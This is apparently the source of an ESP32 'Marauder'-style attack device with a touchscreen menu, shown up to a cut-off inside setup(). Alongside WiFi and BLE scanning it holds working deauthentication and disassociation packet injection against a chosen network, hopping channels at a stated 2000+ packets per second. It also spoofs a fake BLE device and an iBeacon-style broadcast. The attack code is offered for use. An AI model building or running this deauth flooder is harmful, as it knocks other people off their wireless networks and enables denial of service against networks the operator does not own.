#include <SPI.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <NimBLEDevice.h>
#include <SD.h>

// Pin definitions
#define TOUCH_CS 21
#define SD_CS    12

// Touch calibration for 2.8" 320x240 screen
#define TS_MINX 100
#define TS_MAXX 3800
#define TS_MINY 200
#define TS_MAXY 3900

// Layout constants
const int buttonMarginX = 50;
const int buttonWidth = 160;
const int buttonHeight = 40;
const int buttonSpacing = 10;

const int listBaseY = 80;
const int listMaxVisible = 3;
const int listButtonHeight = 30;
const int listButtonSpacing = 5;

const int screenHeight = 240;

// Menu system
enum MenuState {
  MAIN_MENU,
  WIFI_SUBMENU,
  WIFI_ATTACK,
  WIFI_SCAN_RESULTS,
  BT_SUBMENU,
  BLE_SCAN_RESULTS,
  BLE_ADVERTISE,
  BLE_BEACON,
  SCAN_NETWORKS
};
MenuState currentMenu = MAIN_MENU;

// Button structures
struct Button {
  int x, y, w, h;
  const char* label;
  uint16_t color;
};

Button mainMenuButtons[] = {
  {buttonMarginX, 60, buttonWidth, buttonHeight, "WiFi", TFT_DARKGREEN},
  {buttonMarginX, 110, buttonWidth, buttonHeight, "Bluetooth", TFT_BLUE},
  {buttonMarginX, 160, buttonWidth, buttonHeight, "Scan Networks", TFT_BLUE}
};

Button wifiSubMenuButtons[] = {
  {buttonMarginX, 60, buttonWidth, buttonHeight, "WiFi Scan", TFT_ORANGE},
  {buttonMarginX, 110, buttonWidth, buttonHeight, "WiFi Attack", TFT_ORANGE},
  {buttonMarginX, 160, buttonWidth, buttonHeight, "Back to Main Menu", TFT_RED}
};

Button btSubMenuButtons[] = {
  {buttonMarginX, 60, buttonWidth, buttonHeight, "BLE Scan", TFT_ORANGE},
  {buttonMarginX, 110, buttonWidth, buttonHeight, "BLE Advertise", TFT_ORANGE},
  {buttonMarginX, 160, buttonWidth, buttonHeight, "BLE Beacon", TFT_ORANGE},
  {buttonMarginX, 210, buttonWidth, buttonHeight, "Back to Main Menu", TFT_RED}
};


TFT_eSPI tft = TFT_eSPI();
XPT2046_Touchscreen ts(TOUCH_CS);

// Global variables
File logFile;

String scannedNetworks[50];
int scannedNetworkCount = 0;
int wifiAttackScrollOffset = 0;
int wifiAttackHighlightIndex = 0;
bool wifiAttackBackButtonSelected = false;


int mainMenuHighlightIndex = 0;
int wifiSubMenuHighlightIndex = 0;
int wifiScanResultsHighlightIndex = 0;
int wifiScanResultsScrollOffset = 0;
bool wifiScanBackButtonSelected = false;
int btSubMenuHighlightIndex = 0;
int bleScanResultsHighlightIndex = 0;
int bleScanResultsScrollOffset = 0;
bool bleScanBackButtonSelected = false;

String btDevices[20];
String btAddresses[20];
int btCount = 0;

bool isBeaconActive = false;
bool isAdvertiseActive = false;
NimBLEAdvertising* pAdvertising = nullptr;
NimBLEScan* pBLEScan = nullptr;

unsigned long bleScanStart = 0;
bool bleScanInProgress = false;

bool wifiScanInProgress = false;
unsigned long wifiScanStart = 0;

bool deauthActive = false;
String targetSSID = "";

// Enhanced Multi-Channel Deauth Variables
int deauthPacketCount = 100;  // Increased packets per burst
unsigned long lastDeauthTime = 0;
int deauthInterval = 50;  // Faster bursts - 50ms = 20 bursts per second

// Multi-channel attack
uint8_t attackChannels[] = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};  // Common channels
int currentChannelIndex = 0;
int channelCount = sizeof(attackChannels) / sizeof(attackChannels[0]);

// Async deauth scan variables
bool deauthScanInProgress = false;
unsigned long deauthScanStart = 0;
uint8_t targetBSSID[6];
bool targetFound = false;
uint8_t targetChannel = 1;

// Non-blocking delay variables
unsigned long bleOperationStart = 0;
bool bleOperationInProgress = false;

// Status message handling
unsigned long statusMessageTime = 0;
bool showingStatusMessage = false;

unsigned long scanNetworksTimeout = 0;

// Enhanced Deauth Packet Structures
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                           // Frame Control: Deauth
  0x00, 0x00,                           // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP BSSID (filled later)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP BSSID (filled later)
  0x00, 0x00,                           // Sequence Control
  0x07, 0x00                            // Reason Code: Class 3 frame from non-associated station
};

uint8_t disassocPacket[26] = {
  0xA0, 0x00,                           // Frame Control: Disassociation
  0x00, 0x00,                           // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: Broadcast
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source: AP BSSID (filled later)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: AP BSSID (filled later)
  0x00, 0x00,                           // Sequence Control
  0x02, 0x00                            // Reason Code: Previous authentication no longer valid
};

// NimBLE Scan Callbacks
class NimBLEScanCallbacksImpl : public NimBLEScanCallbacks {
public:
  void onResult(NimBLEAdvertisedDevice* device) {
    if (btCount >= 20) return;
    String name = String(device->getName().c_str());
    if (name.length() == 0) name = "Unknown";
    btDevices[btCount] = name;
    btAddresses[btCount] = String(device->getAddress().toString().c_str());
    btCount++;
    
    if(logFile) {
      logFile.println("BLE: " + name + " (" + btAddresses[btCount-1] + ")");
      logFile.flush();
    }
  }
};
NimBLEScanCallbacksImpl bleCallback;

// DRAW HELPERS
void drawButton(const Button& btn) {
  tft.fillRoundRect(btn.x, btn.y, btn.w, btn.h, 8, btn.color);
  tft.drawRoundRect(btn.x, btn.y, btn.w, btn.h, 8, TFT_WHITE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  int16_t tw = tft.textWidth(btn.label);
  int16_t th = 8;
  tft.setCursor(btn.x + (btn.w - tw) / 2, btn.y + (btn.h - th) / 2);
  tft.print(btn.label);
}

void drawStatus(const char* msg) {
  tft.fillRect(0, 220, 320, 20, TFT_BLACK);
  tft.setCursor(10, 224);
  tft.setTextColor(TFT_YELLOW);
  tft.print(msg);
  tft.setTextColor(TFT_WHITE);
}

void drawHighlight(int x, int y, int w, int h) {
  tft.drawRect(x - 2, y - 2, w + 4, h + 4, TFT_WHITE);
}

// Draw Up/Down/OK controls in left corner
void drawLeftCornerControls() {
  tft.fillRoundRect(5, 40, 25, 25, 4, TFT_DARKGREY);
  tft.setCursor(12, 47); tft.setTextColor(TFT_WHITE); tft.setTextSize(1); tft.print("^");
  tft.fillRoundRect(5, 120, 25, 25, 4, TFT_DARKGREY);
  tft.setCursor(9, 127); tft.setTextColor(TFT_WHITE); tft.setTextSize(1); tft.print("OK");
  tft.fillRoundRect(5, 200, 25, 25, 4, TFT_DARKGREY);
  tft.setCursor(12, 207); tft.setTextColor(TFT_WHITE); tft.setTextSize(1); tft.print("v");
}

// DRAW MENUS
void drawMainMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(50, 20);
  tft.print("ESP32 MARAUDER");
  tft.setTextSize(1);
  tft.setCursor(50, 40);
  tft.setTextColor(TFT_CYAN);
  tft.print("Multi-Channel Ready");
  
  for (int i = 0; i < 3; i++) {
    int ypos = listBaseY + i * (listButtonHeight + listButtonSpacing);
    if (i == mainMenuHighlightIndex && currentMenu == MAIN_MENU) {
      tft.setTextColor(TFT_YELLOW);
      drawHighlight(buttonMarginX, ypos - 2, buttonWidth, listButtonHeight);
    } else {
      tft.setTextColor(TFT_WHITE);
    }
    tft.setCursor(buttonMarginX + 6, ypos + 6);
    tft.print(mainMenuButtons[i].label);
  }
  
  drawLeftCornerControls();
  drawStatus("Ready for high-speed attacks");
}

void drawWiFiSubMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(50, 20);
  tft.print("WiFi Options:");
  for (int i = 0; i < 3; i++) {
    int ypos = listBaseY + i * (listButtonHeight + listButtonSpacing);
    if (i == wifiSubMenuHighlightIndex && currentMenu == WIFI_SUBMENU) {
      tft.setTextColor(TFT_YELLOW);
      drawHighlight(buttonMarginX, ypos - 2, buttonWidth, listButtonHeight);
    } else {
      tft.setTextColor(TFT_WHITE);
    }
    tft.setCursor(buttonMarginX + 6, ypos + 6);
    tft.print(wifiSubMenuButtons[i].label);
  }
  
  drawLeftCornerControls();
  drawStatus("Use controls to navigate");
}

void drawBTSubMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(50, 20);
  tft.print("Bluetooth Options:");
  for (int i = 0; i < 4; i++) {
    int ypos = listBaseY + i * (listButtonHeight + listButtonSpacing);
    if (i == btSubMenuHighlightIndex && currentMenu == BT_SUBMENU) {
      tft.setTextColor(TFT_YELLOW);
      drawHighlight(buttonMarginX, ypos - 2, buttonWidth, listButtonHeight);
    } else {
      tft.setTextColor(TFT_WHITE);
    }
    tft.setCursor(buttonMarginX + 6, ypos + 6);
    tft.print(btSubMenuButtons[i].label);
  }
  
  drawLeftCornerControls();
  drawStatus("Use controls to navigate");
}

// WiFi Attack Menu with Navigable Back Button
void drawWiFiAttackMenu() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(50, 10);
  tft.print("WiFi Attack");

  // Status display with packet rate
  tft.setTextSize(1);
  tft.setCursor(50, 35);
  if (deauthActive) {
    tft.setTextColor(TFT_RED);
    tft.print("ATTACKING: " + targetSSID);
    tft.setCursor(50, 50);
    tft.setTextColor(TFT_CYAN);
    int packetsPerSecond = (deauthPacketCount * 2 * 1000) / deauthInterval;  // *2 for deauth+disassoc
    tft.print("Rate: " + String(packetsPerSecond) + " pps");
    tft.setCursor(50, 65);
    tft.print("Multi-CH: " + String(channelCount) + " channels");
  } else {
    tft.setTextColor(TFT_GREEN);
    tft.print("Ready - Target: 2000+ PPS");
    tft.setCursor(50, 50);
    tft.setTextColor(TFT_WHITE);
    tft.print("Multi-channel hopping");
  }

 
  int totalItems = scannedNetworkCount + 1; // +1 for back button
  if (wifiAttackHighlightIndex >= totalItems && totalItems > 0) {
    wifiAttackHighlightIndex = totalItems - 1;
  }
  if (wifiAttackHighlightIndex < 0) {
    wifiAttackHighlightIndex = 0;
  }

 
  wifiAttackBackButtonSelected = (wifiAttackHighlightIndex >= scannedNetworkCount);

  int startIdx = wifiAttackScrollOffset;
  int endIdx = startIdx + listMaxVisible;
  if (endIdx > scannedNetworkCount) endIdx = scannedNetworkCount;

  if (scannedNetworkCount == 0) {
    tft.setCursor(buttonMarginX, listBaseY);
    tft.setTextColor(TFT_WHITE);
    tft.print("No networks available");
    tft.setCursor(buttonMarginX, listBaseY + 20);
    tft.print("Go back and scan first");
  } else {
    // Simple list display without buttons
    for (int i = startIdx; i < endIdx; i++) {
      int ypos = listBaseY + (i - startIdx) * (listButtonHeight + listButtonSpacing);
      if (i == wifiAttackHighlightIndex && !wifiAttackBackButtonSelected) {
        tft.setTextColor(TFT_YELLOW);
        drawHighlight(buttonMarginX, ypos - 2, buttonWidth, listButtonHeight);
      } else {
        tft.setTextColor(TFT_WHITE);
      }
      tft.setCursor(buttonMarginX + 5, ypos + 8);
      tft.print(String(i + 1) + ": " + scannedNetworks[i]);
    }
  }

  // Draw back button as navigable option
  int backButtonY = 190;
  if (wifiAttackBackButtonSelected) {
    tft.setTextColor(TFT_YELLOW);
    drawHighlight(buttonMarginX, backButtonY - 2, buttonWidth, 25);
  } else {
    tft.setTextColor(TFT_WHITE);
  }
  tft.fillRoundRect(buttonMarginX, backButtonY, buttonWidth, 25, 4, TFT_RED);
  tft.drawRoundRect(buttonMarginX, backButtonY, buttonWidth, 25, 4, TFT_WHITE);
  tft.setCursor(buttonMarginX + 60, backButtonY + 8);
  tft.setTextColor(TFT_WHITE);
  tft.print("Back");

  drawLeftCornerControls();
  
  if (deauthActive) {
    drawStatus("HIGH-SPEED ATTACK! TAP TO STOP");
  } else {
    drawStatus("Navigate: ^/v  Attack: OK");
  }
}

void drawWiFiScanResults() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(60, 10);
  tft.print("WiFi Networks");
  
  
  int totalItems = scannedNetworkCount + 1;
  if (wifiScanResultsHighlightIndex >= totalItems && totalItems > 0) {
    wifiScanResultsHighlightIndex = totalItems - 1;
  }
  if (wifiScanResultsHighlightIndex < 0) {
    wifiScanResultsHighlightIndex = 0;
  }

  // Determine if back button is selected
  wifiScanBackButtonSelected = (wifiScanResultsHighlightIndex >= scannedNetworkCount);

  tft.setTextSize(1);
  int startIdx = wifiScanResultsScrollOffset;
  int endIdx = startIdx + listMaxVisible;
  if (endIdx > scannedNetworkCount) endIdx = scannedNetworkCount;
  
  if (scannedNetworkCount == 0) {
    tft.setCursor(buttonMarginX, listBaseY);
    tft.setTextColor(TFT_WHITE);
    tft.print("No networks found");
  } else {
    for (int i = startIdx; i < endIdx; i++) {
      int ypos = listBaseY + (i - startIdx) * (listButtonHeight + listButtonSpacing);
      if (i == wifiScanResultsHighlightIndex && !wifiScanBackButtonSelected) {
        tft.setTextColor(TFT_YELLOW);
        drawHighlight(buttonMarginX, ypos - 2, buttonWidth, listButtonHeight);
      } else {
        tft.setTextColor(TFT_WHITE);
      }
      tft.setCursor(buttonMarginX + 5, ypos + 5);
      tft.print(String(i + 1) + ": " + scannedNetworks[i]);
    }
  }

  // Draw back button as navigable option
  int backButtonY = 190;
  if (wifiScanBackButtonSelected) {
    tft.setTextColor(TFT_YELLOW);
    drawHighlight(buttonMarginX, backButtonY - 2, buttonWidth, 25);
  } else {
    tft.setTextColor(TFT_WHITE);
  }
  tft.fillRoundRect(buttonMarginX, backButtonY, buttonWidth, 25, 4, TFT_RED);
  tft.drawRoundRect(buttonMarginX, backButtonY, buttonWidth, 25, 4, TFT_WHITE);
  tft.setCursor(buttonMarginX + 60, backButtonY + 8);
  tft.setTextColor(TFT_WHITE);
  tft.print("Back");
  
  drawLeftCornerControls();
  drawStatus(("Found " + String(scannedNetworkCount) + " networks").c_str());
}

void drawBLEScanResults() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.setCursor(50, 10);
  tft.print("BLE Devices");
  
  // Similar implementation for BLE scan results...
  int totalItems = btCount + 1;
  if (bleScanResultsHighlightIndex >= totalItems && totalItems > 0) {
    bleScanResultsHighlightIndex = totalItems - 1;
  }
  if (bleScanResultsHighlightIndex < 0) {
    bleScanResultsHighlightIndex = 0;
  }

  bleScanBackButtonSelected = (bleScanResultsHighlightIndex >= btCount);

  tft.setTextSize(1);
  int startIdx = bleScanResultsScrollOffset;
  int endIdx = startIdx + listMaxVisible;
  if (endIdx > btCount) endIdx = btCount;
  
  if (btCount == 0) {
    tft.setCursor(buttonMarginX, listBaseY);
    tft.setTextColor(TFT_WHITE);
    tft.print("No devices found");
  } else {
    for (int i = startIdx; i < endIdx; i++) {
      int ypos = listBaseY + (i - startIdx) * (listButtonHeight + listButtonSpacing);
      if (i == bleScanResultsHighlightIndex && !bleScanBackButtonSelected) {
        tft.setTextColor(TFT_YELLOW);
        drawHighlight(buttonMarginX, ypos - 2, buttonWidth, listButtonHeight);
      } else {
        tft.setTextColor(TFT_WHITE);
      }
      tft.setCursor(buttonMarginX + 5, ypos + 5);
      tft.print(String(i + 1) + ": " + btDevices[i]);
    }
  }

  // Draw back button as navigable option
  int backButtonY = 190;
  if (bleScanBackButtonSelected) {
    tft.setTextColor(TFT_YELLOW);
    drawHighlight(buttonMarginX, backButtonY - 2, buttonWidth, 25);
  }
  tft.fillRoundRect(buttonMarginX, backButtonY, buttonWidth, 25, 4, TFT_RED);
  tft.drawRoundRect(buttonMarginX, backButtonY, buttonWidth, 25, 4, TFT_WHITE);
  tft.setCursor(buttonMarginX + 60, backButtonY + 8);
  tft.setTextColor(TFT_WHITE);
  tft.print("Back");
  
  drawLeftCornerControls();
  drawStatus(("Found " + String(btCount) + " BLE devices").c_str());
}

// TOUCH HANDLERS

void handleMainMenuTouch(int x, int y) {
  int section = y / (screenHeight / 3);
  const int menuCount = 3;
  if (section == 0) { // DOWN (inverted)
    if (mainMenuHighlightIndex < menuCount - 1) mainMenuHighlightIndex++;
    drawMainMenu();
  } else if (section == 1) { // OK
    int sel = mainMenuHighlightIndex;
    if (sel == 0) { currentMenu = WIFI_SUBMENU; wifiSubMenuHighlightIndex = 0; drawWiFiSubMenu(); }
    else if (sel == 1) { currentMenu = BT_SUBMENU; btSubMenuHighlightIndex = 0; drawBTSubMenu(); }
    else if (sel == 2) { currentMenu = SCAN_NETWORKS; scanNetworksMenu(); }
  } else { // UP (inverted)
    if (mainMenuHighlightIndex > 0) mainMenuHighlightIndex--;
    drawMainMenu();
  }
}

void handleWiFiSubMenuTouch(int x, int y) {
  int section = y / (screenHeight / 3);
  const int menuCount = 3;
  if (section == 0) { // DOWN (inverted)
    if (wifiSubMenuHighlightIndex < menuCount - 1) wifiSubMenuHighlightIndex++;
    drawWiFiSubMenu();
  } else if (section == 1) { // OK
    int sel = wifiSubMenuHighlightIndex;
    if (sel == 0) { 
      currentMenu = WIFI_SCAN_RESULTS; 
      wifiScanResultsHighlightIndex = 0;
      wifiScanResultsScrollOffset = 0;
      startWiFiScan(); 
    }
    else if (sel == 1) {
      if (scannedNetworkCount == 0) {
        drawStatus("No networks scanned!");
        statusMessageTime = millis();
        showingStatusMessage = true;
      } else {
        currentMenu = WIFI_ATTACK;
        wifiAttackScrollOffset = 0;
        wifiAttackHighlightIndex = 0;
        drawWiFiAttackMenu();
      }
    } else if (sel == 2) {
      currentMenu = MAIN_MENU;
      mainMenuHighlightIndex = 0;
      drawMainMenu();
    }
  } else { // UP (inverted)
    if (wifiSubMenuHighlightIndex > 0) wifiSubMenuHighlightIndex--;
    drawWiFiSubMenu();
  }
}

void handleBTSubMenuTouch(int x, int y) {
  int section = y / (screenHeight / 3);
  const int menuCount = 4;
  if (section == 0) { // DOWN (inverted)
    if (btSubMenuHighlightIndex < menuCount - 1) btSubMenuHighlightIndex++;
    drawBTSubMenu();
  } else if (section == 1) { // OK
    int sel = btSubMenuHighlightIndex;
    if (sel == 0) { 
      currentMenu = BLE_SCAN_RESULTS; 
      bleScanResultsHighlightIndex = 0;
      bleScanResultsScrollOffset = 0;
      startBLEScan(); 
    }
    else if (sel == 1) {
      if (!isAdvertiseActive) startBLEAdvertise();
      else stopBLEAdvertise();
      bleOperationInProgress = true;
      bleOperationStart = millis();
    } else if (sel == 2) {
      if (!isBeaconActive) startBLEBeacon();
      else stopBLEBeacon();
      bleOperationInProgress = true;
      bleOperationStart = millis();
    } else if (sel == 3) {
      currentMenu = MAIN_MENU;
      mainMenuHighlightIndex = 0;
      drawMainMenu();
    }
  } else { // UP (inverted)
    if (btSubMenuHighlightIndex > 0) btSubMenuHighlightIndex--;
    drawBTSubMenu();
  }
}

// Enhanced WiFi Attack Touch Handler
void handleWiFiAttackTouch(int x, int y) {
  int section = y / (screenHeight / 3);
  int totalItems = scannedNetworkCount + 1;

  switch (section) {
    case 0: // DOWN (inverted)
      if (wifiAttackHighlightIndex < totalItems - 1) wifiAttackHighlightIndex++;
      if (wifiAttackHighlightIndex >= wifiAttackScrollOffset + listMaxVisible && !wifiAttackBackButtonSelected) {
        wifiAttackScrollOffset++;
      }
      drawWiFiAttackMenu();
      break;
    case 1: // OK
      if (wifiAttackBackButtonSelected) {
        // Back button selected
        stopWiFiDeauth();
        currentMenu = WIFI_SUBMENU;
        drawWiFiSubMenu();
      } else if (scannedNetworkCount > 0) {
        // Network selected
        if (deauthActive) {
          stopWiFiDeauth();
        } else {
          startWiFiDeauth(scannedNetworks[wifiAttackHighlightIndex]);
        }
        drawWiFiAttackMenu();
      }
      break;
    case 2: // UP (inverted)
      if (wifiAttackHighlightIndex > 0) wifiAttackHighlightIndex--;
      if (wifiAttackHighlightIndex < wifiAttackScrollOffset) wifiAttackScrollOffset--;
      if (wifiAttackScrollOffset < 0) wifiAttackScrollOffset = 0;
      drawWiFiAttackMenu();
      break;
  }
}

void handleWiFiScanResultsTouch(int x, int y) {
  int section = y / (screenHeight / 3);
  int totalItems = scannedNetworkCount + 1;

  switch (section) {
    case 0: // DOWN (inverted)
      if (wifiScanResultsHighlightIndex < totalItems - 1) wifiScanResultsHighlightIndex++;
      if (wifiScanResultsHighlightIndex >= wifiScanResultsScrollOffset + listMaxVisible && !wifiScanBackButtonSelected) {
        wifiScanResultsScrollOffset++;
      }
      drawWiFiScanResults();
      break;
    case 1: // OK
      if (wifiScanBackButtonSelected) {
        currentMenu = WIFI_SUBMENU;
        drawWiFiSubMenu();
      }
      break;
    case 2: 
      if (wifiScanResultsHighlightIndex > 0) wifiScanResultsHighlightIndex--;
      if (wifiScanResultsHighlightIndex < wifiScanResultsScrollOffset) wifiScanResultsScrollOffset--;
      if (wifiScanResultsScrollOffset < 0) wifiScanResultsScrollOffset = 0;
      drawWiFiScanResults();
      break;
  }
}

void handleBLEScanResultsTouch(int x, int y) {
  int section = y / (screenHeight / 3);
  int totalItems = btCount + 1;

  switch (section) {
    case 0: // DOWN (inverted)
      if (bleScanResultsHighlightIndex < totalItems - 1) bleScanResultsHighlightIndex++;
      if (bleScanResultsHighlightIndex >= bleScanResultsScrollOffset + listMaxVisible && !bleScanBackButtonSelected) {
        bleScanResultsScrollOffset++;
      }
      drawBLEScanResults();
      break;
    case 1: // OK
      if (bleScanBackButtonSelected) {
        currentMenu = BT_SUBMENU;
        drawBTSubMenu();
      }
      break;
    case 2: // UP (inverted)
      if (bleScanResultsHighlightIndex > 0) bleScanResultsHighlightIndex--;
      if (bleScanResultsHighlightIndex < bleScanResultsScrollOffset) bleScanResultsScrollOffset--;
      if (bleScanResultsScrollOffset < 0) bleScanResultsScrollOffset = 0;
      drawBLEScanResults();
      break;
  }
}

// Main touch handler with deauth stop on any touch
void handleTouch(int x, int y) {

  if (deauthActive) {
    stopWiFiDeauth();
    drawWiFiAttackMenu();
    return;
  }

  switch (currentMenu) {
    case MAIN_MENU:
      handleMainMenuTouch(x, y);
      break;
    case WIFI_SUBMENU:
      handleWiFiSubMenuTouch(x, y);
      break;
    case BT_SUBMENU:
      handleBTSubMenuTouch(x, y);
      break;
    case WIFI_ATTACK:
      handleWiFiAttackTouch(x, y);
      break;
    case WIFI_SCAN_RESULTS:
      if (!wifiScanInProgress) {
        handleWiFiScanResultsTouch(x, y);
      }
      break;
    case BLE_SCAN_RESULTS:
      if (!bleScanInProgress) {
        handleBLEScanResultsTouch(x, y);
      }
      break;
    case SCAN_NETWORKS:
      if (!bleScanInProgress && !wifiScanInProgress) {
        currentMenu = MAIN_MENU;
        drawMainMenu();
      }
      break;
  }
}

// WiFi Async Scan 
void startWiFiScan() {
  WiFi.disconnect(true);  
  delay(100);             
  
  scannedNetworkCount = 0;
  wifiScanInProgress = true;
  wifiScanStart = millis();
  WiFi.scanNetworks(true);
  drawStatus("Scanning WiFi networks...");
}

void handleWiFiScan() {
  if (!wifiScanInProgress) return;
  int scanStatus = WiFi.scanComplete();
  if (scanStatus >= 0) {
    scannedNetworkCount = scanStatus;
    wifiScanInProgress = false;
    for (int i = 0; i < scannedNetworkCount && i < 50; i++) {
      scannedNetworks[i] = WiFi.SSID(i);
      if (logFile) {
        logFile.println("WiFi: " + scannedNetworks[i]);
        logFile.flush();
      }
    }
    if (currentMenu == WIFI_SCAN_RESULTS) {
      drawWiFiScanResults();
    }
    Serial.printf("[SCAN] Found %d WiFi networks\n", scannedNetworkCount);
  }
}

// BLE Functions
void initBLE() {
  NimBLEDevice::init("");
  pBLEScan = NimBLEDevice::getScan();
  pBLEScan->setScanCallbacks(&bleCallback);
  pBLEScan->setActiveScan(true);
  pAdvertising = NimBLEDevice::getAdvertising();
}

void startBLEScan() {
  btCount = 0;
  bleScanInProgress = true;
  bleScanStart = millis();
  pBLEScan->start(5, false);
  drawStatus("Scanning BLE devices...");
}

void handleBLEScan() {
  if (!bleScanInProgress) return;
  if (millis() - bleScanStart >= 5000) {
    pBLEScan->stop();
    bleScanInProgress = false;
    if (currentMenu == BLE_SCAN_RESULTS) {
      drawBLEScanResults();
    }
    Serial.printf("[BLE] Found %d devices\n", btCount);
  }
}

void startBLEAdvertise() {
  if (isAdvertiseActive) return;
  NimBLEAdvertisementData advData;
  advData.setFlags(0x06);
  advData.setName("FakeDevice");
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();
  isAdvertiseActive = true;
  drawStatus("BLE Advertise Started");
  Serial.println("[BLE] Advertising started");
}

void stopBLEAdvertise() {
  if (!isAdvertiseActive) return;
  pAdvertising->stop();
  isAdvertiseActive = false;
  drawStatus("BLE Advertise Stopped");
  Serial.println("[BLE] Advertising stopped");
}

void startBLEBeacon() {
  if (isBeaconActive) return;
  static uint8_t payload[] = {
    0x02, 0x01, 0x06, 0x1A, 0xFF, 0x4C, 0x00, 0x02, 0x15,
    0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0,
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0xC5, 0x00
  };
  NimBLEAdvertisementData advData;
  advData.setManufacturerData(std::string((const char*)payload, sizeof(payload)));
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();
  isBeaconActive = true;
  drawStatus("BLE Beacon Started");
  Serial.println("[BLE] Beacon started");
}

void stopBLEBeacon() {
  if (!isBeaconActive) return;
  pAdvertising->stop();
  isBeaconActive = false;
  drawStatus("BLE Beacon Stopped");
  Serial.println("[BLE] Beacon stopped");
}

// Multi-Channel WiFi Deauth Functions
void startWiFiDeauth(String ssid) {
  WiFi.disconnect(true); 
  delay(100);            
  
  targetSSID = ssid;
  deauthActive = true;
  targetFound = false;
  deauthScanInProgress = true;
  deauthScanStart = millis();
  WiFi.scanNetworks(true);
  drawStatus(("Finding target: " + ssid).c_str());
  drawWiFiAttackMenu();
  Serial.println("[DEAUTH] Starting multi-channel attack on: " + ssid);
}

void stopWiFiDeauth() {
  deauthActive = false;
  deauthScanInProgress = false;
  targetSSID = "";
  currentChannelIndex = 0;
  drawStatus("Deauth stopped");
  Serial.println("[DEAUTH] Multi-channel attack stopped");
}


void handleDeauth() {
  // Handle async scan for deauth target
  if (deauthScanInProgress) {
    int scanStatus = WiFi.scanComplete();
    if (scanStatus >= 0) {
      deauthScanInProgress = false;
      for (int i = 0; i < scanStatus; i++) {
        if (targetSSID == WiFi.SSID(i)) {
          const uint8_t* bssidPtr = WiFi.BSSID(i);
          memcpy(targetBSSID, bssidPtr, 6);
          targetChannel = WiFi.channel(i);
          targetFound = true;
          
          // Set promiscuous mode for raw packet injection
          esp_wifi_set_promiscuous(false);
          esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
          esp_wifi_set_promiscuous(true);
          
          drawStatus("Multi-CH Attack Active");
          Serial.printf("[DEAUTH] Target found on channel %d, starting multi-channel burst\n", targetChannel);
          break;
        }
      }
      if (!targetFound) {
        drawStatus("SSID not found");
        deauthActive = false;
        Serial.println("[DEAUTH] Target SSID not found");
      }
    }
    return;
  }

  if (!deauthActive || targetSSID.length() == 0 || !targetFound) return;

  // MULTI-CHANNEL ATTACK
  if (millis() - lastDeauthTime >= deauthInterval) {
    lastDeauthTime = millis();
    
    // Cycle through multiple channels
    for (int ch = 0; ch < channelCount; ch++) {
      // Set channel
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_channel(attackChannels[ch], WIFI_SECOND_CHAN_NONE);
      esp_wifi_set_promiscuous(true);
      
      // Send packet burst on this channel
      for (int i = 0; i < (deauthPacketCount / channelCount); i++) {
        // Deauth packet
        memset(&deauthPacket[4], 0xFF, 6);             
        memcpy(&deauthPacket[10], targetBSSID, 6);     
        memcpy(&deauthPacket[16], targetBSSID, 6);     
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
        
        
        memset(&disassocPacket[4], 0xFF, 6);          
        memcpy(&disassocPacket[10], targetBSSID, 6);   
        memcpy(&disassocPacket[16], targetBSSID, 6);  
        esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), true);
        
        delayMicroseconds(25);  // Very short delay for rapid transmission
      }
    }
    
    // Return to target channel
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
  }
}

// Scan Networks Menu 
void scanNetworksMenu() {
  WiFi.disconnect(true); 
  delay(100);
  
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setCursor(50, 10);
  tft.print("Scanning WiFi & BLE...");
  tft.setTextSize(1);
  tft.setCursor(50, 40);
  tft.print("Simultaneous scan in progress");
  
  startWiFiScan();
  startBLEScan();
  currentMenu = SCAN_NETWORKS;
  scanNetworksTimeout = millis();
}


void handleBLEOperationDelay() {
  if (bleOperationInProgress && millis() - bleOperationStart >= 1200) {
    bleOperationInProgress = false;
    drawBTSubMenu();
  }
}

void handleStatusMessage() {
  if (showingStatusMessage && millis() - statusMessageTime >= 800) {
    showingStatusMessage = false;
    if (currentMenu == WIFI_SUBMENU) {
      drawWiFiSubMenu();
    }
  }
}


void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("========================================");
  Serial.println("    ESP32 MARAUDER - MULTI-CHANNEL");
  Serial.println("    Burst Deauth + BLE + Touch UI");
  Serial.println("    Target: 2000+ PPS Multi-Channel");
  Serial.println("    With Enforced WiFi Disconnect");
  Serial.println("========================================");
  
  setCpuFrequencyMhz(240);
